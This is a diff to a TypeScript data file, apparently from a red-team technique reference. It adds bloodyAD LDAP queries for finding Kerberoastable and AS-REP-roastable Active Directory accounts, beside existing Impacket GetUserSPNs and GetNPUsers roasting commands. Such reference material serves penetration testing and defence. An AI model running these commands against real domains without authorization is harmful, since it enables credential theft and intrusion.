@@ -21,8 +21,14 @@ export const credentialAccessNodes: TechniqueNodeDef[] = [
     tools: [
       { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
       { name: 'GetUserSPNs (Impacket)', url: 'https://github.com/fortra/impacket' },
+      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
     ],
     commands: [
+      {
+        label: 'Find Kerberoastable accounts (bloodyAD)',
+        code: "bloodyAD -u user -p pass -d domain.local --host dc01 get search --filter '(&(servicePrincipalName=*)(!(objectClass=computer)))' --attr sAMAccountName,servicePrincipalName",
+        lang: 'bash',
+      },
       {
         label: 'Roast from Linux',
         code: 'GetUserSPNs.py DOMAIN/user:pass -dc-ip 10.0.0.1 -request',
@@ -53,8 +59,14 @@ export const credentialAccessNodes: TechniqueNodeDef[] = [
     tools: [
       { name: 'Rubeus', url: 'https://github.com/GhostPack/Rubeus' },
       { name: 'GetNPUsers (Impacket)', url: 'https://github.com/fortra/impacket' },
+      { name: 'bloodyAD', url: 'https://github.com/CravateRouge/bloodyAD' },
     ],
     commands: [
+      {
+        label: 'Find AS-REP-roastable accounts (bloodyAD)',
+        code: "bloodyAD -u user -p pass -d domain.local --host dc01 get search --filter '(userAccountControl:1.2.840.113556.1.4.803:=4194304)' --attr sAMAccountName",
+        lang: 'bash',
+      },
       {
         label: 'Find + roast pre-auth-disabled accounts',
         code: 'GetNPUsers.py DOMAIN/ -usersfile users.txt -dc-ip 10.0.0.1 -no-pass',
